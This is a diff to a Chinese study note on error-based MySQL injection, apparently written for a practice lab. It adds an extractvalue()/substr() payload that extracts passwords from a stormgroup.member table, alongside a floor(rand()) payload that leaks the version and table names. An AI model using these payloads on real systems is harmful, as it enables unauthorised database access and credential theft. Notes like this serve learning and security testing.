@@ -24,6 +24,9 @@
 ```sql
 and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))) %23
 select version()可替换 select table_name from information_schema.tables where table_schema=database() limit 0,1
+
+因为存在长度限制问题，采用substr()函数进行切割
+and (extractvalue(1,concat(0x7e,(select substr(password,1,31) from stormgroup.member limit 1,1),0x7e)))
 ```
 ![](/assets/7DF1248C5FA74AA8624787ECEBB8C368.png)
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and extractvalue(1, payload)
